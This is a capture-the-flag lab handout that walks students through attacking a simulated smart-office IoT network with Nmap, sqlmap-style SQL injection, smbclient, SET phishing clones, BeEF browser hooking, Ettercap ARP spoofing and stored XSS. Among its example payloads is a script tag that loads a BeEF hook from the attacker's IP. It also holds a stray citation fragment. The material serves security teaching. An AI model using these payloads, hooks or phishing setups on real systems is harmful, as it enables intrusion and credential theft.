

---

# Smart Office IoT Lab: Penetration Testing Challenge

## Lab Overview

Welcome, aspiring Ethical Hackers, to the Smart Office IoT Capstone Lab! In this scenario, you are a penetration tester tasked with assessing the security posture of a simulated Smart Office IoT network. Your mission is to identify vulnerabilities, exploit them to gain access to sensitive information (represented by "flags"), and finally, provide remediation recommendations. This lab is structured as a **Capture The Flag (CTF)** exercise, where you will use your ethical hacking skills and the Kali Linux tools to locate hidden files containing "flag" values. Be prepared for a trial-and-error approach, requiring persistence and critical thinking.

**Your Attacking Machine:** Kali Linux VM, customized for ethical hacking.
**Target Network:** `labnet` (Docker bridge network) with IP addresses in the `192.168.100.0/24` subnet.

**Important Note on IP Addresses:**

**For *this specific lab environment***, you will be using the `192.168.100.x` subnet. Please translate the IPs as follows:

*   **Your Kali VM (Attacker IP):** `192.168.100.1` (This is typically the IP of the Docker bridge interface on your Kali host that connects to the `labnet` network)
*   **`omnicam` (Vulnerable Camera Web App):** `192.168.100.10` (Port `8081`)
*   **`thermostat` (Vulnerable Thermostat App):** `192.168.100.11` (Port `8082`)
*   **`gateway` (Misconfigured SMB + MQTT broker):** `192.168.100.12` (Port `8080` for web, SMB on `445`)
*   **`dashboard` (Web App):** `192.168.100.13` (Port `8083`)
*   **`employee` (Simulated Internal Workstation):** `192.168.100.20`

---

## Required Resources

*   **Kali Linux VM**: Customized for ethical hacking, with Docker and Docker Compose installed. At least 4GB RAM + 2 CPUs recommended.
*   **Internet Access**: For researching vulnerabilities and updating tools.
*   **Text Editor**: Such as Mousepad, for writing scripts and notes.

---

## Lab Environment Setup Instructions

This section guides you through deploying the vulnerable Smart Office IoT network using Docker Compose.

1.  **Clone the Repository (Simulated):**
    *   `git clone https://github.com/cnshimba/smart-office-capstone.git`
    *   `cd smart-office-capstone`

2.  **Build and Run the Lab:**
    *   `make build`
    *   `make up`

3.  **Verify Services (Optional, after startup):**
    *   IoT Gateway (Samba/web): `http://localhost:8080` or `http://192.168.100.12:8080`
    *   OmniCam v2.0 (web app): `http://localhost:8081` or `http://192.168.100.10:8081`
    *   ClimateMaster 3000 (web app): `http://localhost:8082` or `http://192.168.100.11:8082`
    *   Dashboard (web app): `http://localhost:8083` or `http://192.168.100.13:8083`
    *   Employee Workstation (simulated).

---

## Challenges for Students

**General Instructions:**

*   All challenges are to be performed from your **Kali Linux VM**.
*   **Document your findings**: Record commands used, outputs, and explanations.
*   **Capture Flags**: Each challenge has a hidden "flag" (a string of text in a file) that you must locate and report.
*   **Propose Remediation**: For each major vulnerability exploited, suggest practical remediation steps.

---

### Challenge 1: Network Reconnaissance and Vulnerability Discovery

*   **Objective**: Conduct initial reconnaissance to identify active hosts, open ports, running services, and known vulnerabilities in the lab environment.
*   **Background/Scenario**: You are a penetration tester performing the initial phase of a black-box engagement for a client. You have only been given access to the network and need to discover what systems are present and what services they offer.
*   **Target(s)**: The entire `192.168.100.0/24` subnet.
*   **Tools to Use**: **Nmap**, **Nikto**, **Greenbone Vulnerability Management (GVM)** (optional).
*   **Tasks**:
    1.  **Host and Port Scan**: Run a comprehensive Nmap scan to identify all active hosts, their open ports, and service versions on the `192.168.100.0/24` subnet.
     
    2.  **Vulnerability Script Scan**: For a specific target (e.g., `192.168.100.13`), use Nmap with the `vulners` script to find known CVEs with a CVSS score higher than 4.
        
    3.  **Web Server Scan with Nikto**: Scan the `omnicam` web server (`http://192.168.100.10:8081`) with Nikto to identify common web server misconfigurations and vulnerabilities.

    4.  **SMB Share Enumeration**: Identify if any hosts on the network are running SMB services (ports `139`, `445`). For any identified SMB server, use Nmap's `smb-enum-shares.nse` script to list accessible shares.

    5.  **(Optional) GVM Scan**: If time permits, launch **Greenbone Vulnerability Management (GVM)**, update its databases, and perform a full scan on `192.168.100.13` (Dashboard). Analyze the report for identified vulnerabilities and their severity.
*   **Deliverable/Flag**:
    *   List all active host IPs and their open ports.
    *   Provide **two CVEs** (with scores) identified by Nmap's `vulners` script on `192.168.100.13`.
    *   State the server type and version identified by Nikto for `192.168.100.10:8081`.
*   **Questions for Reflection/Remediation**:
    *   Compare the output of Nmap's `vulners` script with a potential GVM report. Why might they differ?
    *   Based on the Nikto scan results, what are some immediate **remediation steps** for common web server misconfigurations (e.g., missing security headers)?

---

### Challenge 2: Web Application SQL Injection

*   **Objective**: Exploit a SQL injection vulnerability to retrieve sensitive database information, including a hidden flag.
*   **Background/Scenario**: The client's `thermostat` application is suspected to have SQL injection vulnerabilities. Your task is to prove this by extracting user data and finding a flag.
*   **Target**: `thermostat` at `192.168.100.11` (accessible via `http://192.168.100.11:8082`).
*   **Tools to Use**: Web browser, manual SQL injection techniques, or `sqlmap`.
*   **Tasks**:
    1.  **Identify Vulnerable Input**: Access the `thermostat` web application and assume there's an input field vulnerable to SQL injection, similar to the DVWA lab.
    2.  **Bypass Authentication**: Determine how to use an "always true" expression to bypass any simple login (e.g., `' OR 1=1 #`).
    3.  **Determine Number of Columns**: Use the `ORDER BY` clause to find the number of columns in the vulnerable query (e.g., `1' ORDER BY 1 #`).
    4.  **Identify DBMS Version**: Use `UNION SELECT` to determine the database management system (DBMS) version (e.g., `1' OR 1=1 UNION SELECT 1, VERSION()#`).
    5.  **Discover Database Name**: Use `UNION SELECT` to find the database name (e.g., `1' OR 1=1 UNION SELECT 1, DATABASE()#`).
    6.  **Enumerate Table Names**: List the table names within the database (e.g., `1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='<database_name>'#`).
    7.  **Enumerate Column Names**: From the most interesting table (e.g., `users` table), enumerate its column names (e.g., `1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#`).
    8.  **Retrieve User Credentials**: Retrieve usernames and password hashes from that table (e.g., `1' OR 1=1 UNION SELECT user, password FROM users #`).
    9.  **Crack Passwords**: Use **John the Ripper** or **Hashcat** to crack at least one password hash found.
    10. **Exfiltrate Flag**: Use SQL injection techniques to locate and exfiltrate the contents of the `flag_db_dump.sql` file from the `db` folder.
*   **Deliverable/Flag**:
    *   The database name.
    *   One cracked username and password from the `thermostat` database.
    *   The content of `flag_db_dump.sql`.
*   **Questions for Reflection/Remediation**:
    *   What are at least three **mitigation methods** to prevent SQL injection vulnerabilities in web applications?
    *   If you had retrieved password hashes, how would you go about **cracking them** offline using a tool like John the Ripper or Hashcat?

---

### Challenge 3: SMB Share Exploitation

*   **Objective**: Discover and exploit unsecured SMB shares on the `gateway` server to access hidden files and a flag.
*   **Background/Scenario**: Your client has an IoT gateway that uses SMB for file sharing. You suspect there might be publicly accessible shares.
*   **Target**: `gateway` at `192.168.100.12`.
*   **Tools to Use**: **`enum4linux`**, **`smbclient`**.
*   **Tasks**:
    1.  **Enumerate Shares**: Use `enum4linux` to identify all shared directories on the `gateway` (`192.168.100.12`).
     
    2.  **Identify Anonymous Access**: Determine which of these shares are accessible anonymously (without a username/password).
    
    3.  **Access Share & Find Files**: Connect to the `firmware_updates` share using `smbclient`. Navigate through the directories and files within the share to find `flag_firmware.txt`.
      
    4.  **Download Flag**: Download `flag_firmware.txt` to your Kali VM.

    5.  **Retrieve Proprietary Sensor Data**: Access the `sensor_logs` share and download `proprietary_sensor_data.zip`.
*   **Deliverable/Flag**:
    *   The names of all anonymously accessible SMB shares found.
    *   The contents of `flag_firmware.txt`.
    *   The `proprietary_sensor_data.zip` file.
*   **Questions for Reflection/Remediation**:
    *   What are two ways to secure SMB shares to prevent unauthorized access?
    *   What information can `enum4linux` provide beyond just shared directories?

---

### Challenge 4: Social Engineering with SET and BeEF

*   **Objective**: Clone a website to harvest credentials and then use a browser exploitation framework to perform a client-side attack.
*   **Background/Scenario**: You are testing the security awareness of the `employee` workstation. You decide to set up a phishing campaign and then attempt to hook their browser.
*   **Target(s)**:
    *   **`dashboard`**: `192.168.100.13:8083` (for cloning)
    *   **`omnicam`**: `192.168.100.10:8081` (for Stored XSS to deliver BeEF hook)
    *   **`employee`**: `192.168.100.20` (as the victim's browser)
*   **Tools to Use**: **Social Engineer Toolkit (SET)**, **Browser Exploitation Framework (BeEF)**.
*   **Tasks**:
    1.  **Website Cloning (SET)**:
        *   Launch SET (`setoolkit`) as root.
        *   Choose "Social-Engineering Attacks" -> "Website Attack Vectors" -> "Credential Harvester Attack Method" -> "Site Cloner".
        *   Set your Kali VM's IP (`192.168.100.1`) as the web attacker IP for POST backs.
        *   Clone the `dashboard`'s login page (`http://192.168.100.13:8083`).
        *   Create a simple HTML file (`phish_link.html`) on your Kali desktop that redirects to your cloned site (e.g., `http://192.168.100.1:80/`).
        *   Simulate the `employee` workstation browsing to your phishing link.
        *   Enter **fake credentials** (e.g., `testuser/password123`) into the cloned page.
        *   **Verify that SET captured these credentials**.
    2.  **Browser Hooking (BeEF)**:
        *   Start BeEF (`beef-xss`) and log into the web UI (default: `http://127.0.0.1:3000/ui/panel`, username `beef`, password `newbeef`).
        *   Exploit the **Stored XSS vulnerability** in `omnicam` (`http://192.168.100.10:8081/login.php`) by injecting a BeEF hook into the "Your name" input field.
            *   **BeEF Hook Payload (example, verify exact path in BeEF UI):** `<script src="http://192.168.100.1:3000/hook.js"></script>` (replace `192.168.100.1` with your Kali VM's IP on `labnet`).
        *   Simulate the `employee` workstation (or refresh your Kali browser on `omnicam`).
        *   Return to the BeEF control panel and verify that the `employee`'s browser is "hooked" under "Online Browsers".
    3.  **Client-Side Exploitation (BeEF)**:
        *   From the BeEF control panel, navigate to the "Commands" tab for the hooked browser.
        *   Under "Social Engineering," select "Fake Notification Bar (Firefox)".
        *   Change the "Plugin URL" to `http://192.168.100.13:8083` (the `dashboard` login page).
        *   Customize the "alert text" (e.g., "AdBlocker Security Extension is out of date. Install the new version now.").
        *   Click "Execute" and observe the fake alert on the hooked `employee` browser.
        *   (Optional for advanced students) Experiment with **TabNabbing**: Under "Social Engineering," select "TabNabbing". Set the wait time to 1 minute and the URL to a different malicious URL.
*   **Deliverable/Flag**:
    *   The captured fake username and password from the SET credential harvester.
    *   A screenshot of the fake alert displayed on the hooked `employee` browser.
*   **Questions for Reflection/Remediation**:
    *   How could a real organization train its employees to recognize and avoid such social engineering attacks?
    *   What are some ways to detect or prevent a browser from being "hooked" by BeEF?
    *   How could SET and BeEF be used in combination for a more complex social engineering penetration test?

---

##### Challenge 5: On-Path (MITM) Attack and Cleartext Data Capture

*   **Objective**: Perform an ARP spoofing attack between two targets in the lab and capture cleartext network traffic to reveal sensitive information, including a flag.
*   **Background/Scenario**: You suspect that unencrypted communication is happening between the `employee` workstation and the `dashboard` server. You want to intercept this traffic.
*   **Target(s)**:
    *   **`employee`**: `192.168.100.20` (as the victim client)
    *   **`dashboard`**: `192.168.100.13` (as the victim server)
    *   Your Kali VM (`192.168.100.1`) will be the attacker.
*   **Tools to Use**: **Ettercap**, **Wireshark**.
*   **Tasks**:
    1.  **Initial Network Reconnaissance**: From your Kali VM, use `ping` to verify connectivity to `192.168.100.20` and `192.168.100.13`. Simulate checking `employee`'s ARP cache with `ip neighbor`.
    2.  **Start Wireshark**: Launch **Wireshark** on your Kali VM to capture traffic on the `labnet` interface (e.g., `br-` interface if you mapped Docker network to it).
    3.  **Launch Ettercap (CLI)**: Start **Ettercap** in text mode to perform an ARP poisoning attack between `192.168.100.20` (Target 1) and `192.168.100.13` (Target 2), saving the capture to a `.pcap` file.
       
    4.  **Generate Traffic**: While Ettercap is running, simulate traffic by having the `employee` (or your Kali browser) access the `dashboard` login page (`http://192.168.100.13:8083`) and submit **fake credentials** (e.g., `euser/secretpass`).
    5.  **Stop Capture & Analyze**: Stop Ettercap and then stop the Wireshark capture.
    6.  **Find Cleartext Data**: Analyze the `mitm-capture.pcap` file in Wireshark. Filter for HTTP POST requests. Locate the cleartext username, password, and the **PHPSESSID cookie value** submitted to the `dashboard`.
    7.  **Find Flag**: A pre-captured Wireshark file (`SA.pcap`) is located in `/home/kali/Downloads/`. Analyze its content to find the IP address of the target computer (translate from `10.5.5.11` to `192.168.100.x`) and the URL location of `user_accounts.xml`. Retrieve the content of the file and specifically the code associated with "Employee ID 0".
*   **Deliverable/Flag**:
    *   The cleartext username and password captured via Wireshark during the on-path attack.
    *   The PHPSESSID cookie value.
    *   The flag code associated with "Employee ID 0" from `user_accounts.xml`.
*   **Questions for Reflection/Remediation**:
    *   What changes would you observe in the ARP cache of the victim machines after the ARP poisoning attack begins?
    *   What measures should be taken to protect sensitive information transmitted over a network from on-path attacks? Why is using HTTPS crucial?

---

##### Challenge 6: Web Application Cross-Site Scripting (XSS)

*   **Objective**: Identify and exploit a Stored Cross-Site Scripting (XSS) vulnerability in a web application to steal cookies.
*   **Background/Scenario**: The `omnicam` application (`login.php`) has a visitor log that is vulnerable to Stored XSS due to a lack of input sanitization [My current query, 384, 391]. This allows an attacker to inject malicious scripts that execute in other users' browsers.
*   **Target**: `omnicam` at `192.168.100.10` (accessible via `http://192.168.100.10:8081/login.php`).
*   **Tools to Use**: Web browser, manual XSS payloads.
*   **Tasks**:
    1.  **Identify Vulnerable Input**: Access `http://192.168.100.10:8081/login.php` and observe the "Your name" input field and "Visitor log". Notice any immediate alerts that appear upon loading the page.
    2.  **Inject Simple XSS Payload**: Enter a simple Stored XSS payload (e.g., `<script>alert("XSS Successful!")</script>`) into the "Your name" field and submit.
    3.  **Verify Execution**: Refresh the page or revisit it to see if the payload executes.
    4.  **Cookie Stealing Payload**: If successful, try to replace the `alert()` script with a cookie-stealing payload (e.g., `<script>alert(document.cookie)</script>`).
    5.  **Retrieve Cookie**: Capture the session cookie displayed by your payload.
*   **Deliverable/Flag**:
    *   A screenshot of a successful XSS alert popup on the `omnicam` page.
    *   The cookie string captured by your payload.
*   **Questions for Reflection/Remediation**:
    *   What is the difference between Reflected XSS and Stored XSS?
    *   What are some effective input validation and output encoding techniques to prevent XSS vulnerabilities?

---

##### Challenge 7: Automation and Penetration Test Reporting

*   **Objective**: Automate a reconnaissance workflow and then synthesize your findings into a basic penetration test report.
*   **Background/Scenario**: Your client needs a quick overview of the network's security posture and the identified vulnerabilities. You need to present your findings clearly and propose initial remediation.
*   **Target(s)**: All lab services (`192.168.100.x`).
*   **Tools to Use**: **Bash scripting**, text editor, **Nmap**, **`enum4linux`**.
*   **Tasks**:
    1.  **Create an Automated Reconnaissance Script**:
        *   Write a **Bash script** (e.g., `recon.sh`) that takes an IP address as an argument.
        *   The script should check if an IP is provided. If not, it should print correct usage and exit.
        *   It should perform an **Nmap `-sV` scan** on the target IP and save the results to a file (e.g., `scan_results_<IP>.txt`).
        *   If the Nmap scan indicates that port `445` (SMB) is open, automatically run **`enum4linux -U -S`** on the target and append those results to the same `scan_results_<IP>.txt` file.
        *   Make the script executable (`chmod +x recon.sh`).
        *   Run your script against `192.168.100.12` (the `gateway`).
    2.  **Draft a Penetration Test Report**:
        *   Using a markdown editor, draft a **preliminary penetration test report** based on the `pentest_report_template.md` and by reviewing publicly available examples.
        *   Your report should include at least the following sections and summarize your findings from **all** challenges (1-6):
            *   **Executive Summary**: A brief, non-technical overview of the key findings and overall risk.
            *   **Purpose and Scope**: What was tested and why.
            *   **Testing Process and Procedures**: Briefly describe the tools and methods used (Nmap, Nikto, SQLi, SMB, SET, BeEF, Ettercap, Wireshark).
            *   **Test Results (Major Findings)**: List the most significant vulnerabilities discovered and successfully exploited.
            *   **Recommendations**: Propose specific, actionable remediation steps for each major finding, including a priority level (e.g., Priority 1, 2, or 3).
*   **Deliverable/Flag**:
    *   The working Bash script (`recon.sh`).
    *   Your preliminary penetration test report document.
*   **Questions for Reflection/Remediation**:
    *   Why is clear and concise reporting essential for a penetration tester?
    *   How does understanding different vulnerability information sources (CVE, CWE, NVD, CVSS) help in formulating better remediation advice?

---
```
